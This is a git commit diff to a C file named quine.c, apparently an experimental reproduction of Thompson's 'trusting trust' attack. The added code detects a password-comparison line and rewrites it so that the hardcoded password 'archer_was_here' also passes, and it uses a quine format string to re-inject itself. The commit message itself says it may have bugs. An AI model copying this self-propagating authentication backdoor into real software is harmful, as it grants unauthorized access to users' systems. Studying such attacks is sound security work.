4cd673a6aaa8c783d53071ffce861d40efcd4cf0
archer <archerheffern@gmail.com>
2025-01-19 02:35:24 +0000

    quine mostly finished. May have bugs

--- quine.c
+++ quine.c
@@ -7,11 +7,11 @@
 34: Quote
 92: Backslash
 */
-// TODO: Turn this into a quine
 int main() {
-    char* line = "";
-    int i = 0;
-    char** lines = NULL;
+    char* line = "  int num_lines = read_lines_to_array(fp, &lines);\n";
+    int i = 2;
+    FILE* out = stdout;
+    char* lines[] = {line, line, line};
     
     char* inj_point = "  int num_lines = read_lines_to_array(fp, &lines);\n";
     char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
@@ -20,10 +20,9 @@ int main() {
         line = after;
     }
     if (i>=2 && strcmp(lines[i-2], inj_point) == 0) { // Injection
-    //     char* _s = "";
-    //     fwrite(s, strlen(s), 1, out);
+        char buf[2048];
+        char* f = "char* inj_point = %c  int num_lines = read_lines_to_array(fp, &lines);%cn%c;   char* before = %c%c(strcmp(passwords[user_index], password) == 0) {%cn%c    ;   char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c   ;   if (strcmp(line, before) == 0) {line=after;};  if (i >= 2 && strcmp(lines[i-2], inj_point) == 0) { char buf[2048] ; char* f = %c%s%c ; sprintf(buf, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34); fwrite(buf, strlen(buf), 1, out);  }";
+        sprintf(buf, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
+        fwrite(buf, strlen(buf), 1, out);
     }
-
-    char* f = "char* inj_point = %c  int num_lines = read_lines_to_array(fp, &lines);%cn%c;   char* before = %c%c(strcmp(passwords[user_index], password) == 0) {%cn%c    ;   char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c    ;    char* f = %c%s%c   ;     if (strcmp(line, before) == 0) {line=after;};  if (i >= 2 && strcmp(lines[i-2], inj_point) == 0) {}   ; printf(f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);";
-    printf(f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
 }
